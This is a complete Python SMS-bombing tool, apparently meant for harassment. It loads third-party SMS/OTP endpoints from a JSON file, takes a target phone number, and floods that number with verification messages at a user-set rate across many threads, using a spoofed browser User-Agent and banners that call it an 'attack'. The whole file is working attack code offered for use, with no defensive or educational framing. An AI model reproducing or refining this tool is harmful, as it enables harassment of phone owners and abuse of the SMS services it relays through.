import requests
import threading
import json
import time
import os
import itertools
from queue import Queue
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# --- Global Counters & Lock ---
sent_count = 0
failed_count = 0
lock = threading.Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    # Banner remains the same, so I'll omit it for brevity. 
    # You can copy it from the previous version.
    banner = f"""
{Fore.MAGENTA}
██████╗ ██████╗  ██████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔═══██╗   ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔═══╝ ██╔══██╗██║   ██║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██║     ██║  ██║╚██████╔╝   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{Fore.YELLOW}                  >> Producer-Consumer High-Precision Edition <<
{Style.RESET_ALL}
    """
    print(banner)
    print(f"{Fore.CYAN}{'='*90}")
    print(f"{Fore.YELLOW}This tool uses a professional design pattern for precise rate control.")
    print(f"{Fore.CYAN}{'='*90}\n")


def send_request(api_data, phone_number):
    """The actual function that sends one HTTP request."""
    global sent_count, failed_count
    
    try:
        req_info = api_data.get("Request", {})
        url = req_info.get("URL")
        if not url: return

        method = req_info.get("Method", "POST").upper()
        payload = req_info.get("Payload", {})
        headers = req_info.get("Headers", {})

        final_url = url.replace("{{num}}", phone_number)
        payload_str = json.dumps(payload).replace("{{num}}", phone_number)
        final_payload = json.loads(payload_str)

        final_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
        }
        final_headers.update(headers)

        response = None
        if method == "POST":
            response = requests.post(final_url, json=final_payload, headers=final_headers, timeout=10)
        elif method == "GET":
            response = requests.get(final_url, headers=final_headers, timeout=10)

        with lock:
            if response and 200 <= response.status_code < 300:
                sent_count += 1
                print(f"{Fore.GREEN}[SUCCESS] Sent via {final_url.split('/')[2]:<25}")
            else:
                failed_count += 1
                print(f"{Fore.RED}[FAILED]  Failed at {final_url.split('/')[2]:<25}")

    except Exception:
        with lock:
            failed_count += 1
            print(f"{Fore.YELLOW}[ERROR]   Connection or other error.")

def worker(task_queue, phone_number):
    """The 'consumer' function. Waits for tasks and executes them."""
    while True:
        api_data = task_queue.get()
        if api_data is None:  # Sentinel value to stop the thread
            break
        send_request(api_data, phone_number)
        task_queue.task_done()

def main():
    clear_screen()
    print_banner()

    try:
        with open("api.json", "r", encoding="utf-8") as f:
            apis = json.load(f)
        sms_apis = [api for api in apis if api.get("Type") == "sms"]
        if not sms_apis:
            print(f"{Fore.RED}Error: No 'sms' type APIs found in api.json.")
            return
        print(f"{Fore.GREEN}Loaded {len(sms_apis)} SMS APIs successfully.\n")
    except FileNotFoundError:
        print(f"{Fore.RED}Error: 'api.json' not found.")
        return
    except json.JSONDecodeError:
        print(f"{Fore.RED}Error: 'api.json' is not a valid JSON file.")
        return

    try:
        target_phone = input(f"{Fore.CYAN}Enter target phone (e.g., 9123456789): {Style.RESET_ALL}").strip()
        if not target_phone.isdigit() or len(target_phone) != 10:
            print(f"{Fore.RED}Error: Invalid phone number format.")
            return
        
        total_requests = int(input(f"{Fore.CYAN}Enter total number of SMS to send: {Style.RESET_ALL}"))
        rate_per_second = int(input(f"{Fore.CYAN}Enter requests per second (e.g., 3): {Style.RESET_ALL}"))
        num_workers = int(input(f"{Fore.CYAN}Enter number of worker threads (e.g., 20): {Style.RESET_ALL}"))

    except ValueError:
        print(f"{Fore.RED}Error: Invalid input. Please enter numbers.")
        return

    print(f"\n{Fore.YELLOW}Starting attack on 0{target_phone} at a precise rate of {rate_per_second} req/s... Press CTRL+C to stop.{Style.RESET_ALL}")
    print("-" * 90)

    task_queue = Queue()
    api_cycle = itertools.cycle(sms_apis)
    
    # --- Create and start the worker threads (consumers) ---
    threads = []
    for _ in range(num_workers):
        thread = threading.Thread(target=worker, args=(task_queue, target_phone))
        thread.start()
        threads.append(thread)

    # --- The Producer loop ---
    interval = 1.0 / rate_per_second
    try:
        for i in range(total_requests):
            start_time = time.time()
            api_to_use = next(api_cycle)
            task_queue.put(api_to_use) # Put a task in the queue

            # Sleep to maintain the rate
            elapsed_time = time.time() - start_time
            sleep_time = max(0, interval - elapsed_time)
            time.sleep(sleep_time)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Stopping producer... Waiting for tasks to finish.")

    # --- Cleanup ---
    # Wait for all tasks in the queue to be processed
    task_queue.join()

    # Stop the worker threads by sending the sentinel value
    for _ in range(num_workers):
        task_queue.put(None)
    
    for t in threads:
        t.join()

    print("\n" + "=" * 90)
    print(f"{Fore.GREEN}Attack finished!")
    print(f"{Fore.GREEN}Total Successful Requests: {sent_count}")
    print(f"{Fore.RED}Total Failed Requests: {failed_count}")

if __name__ == "__main__":
    main()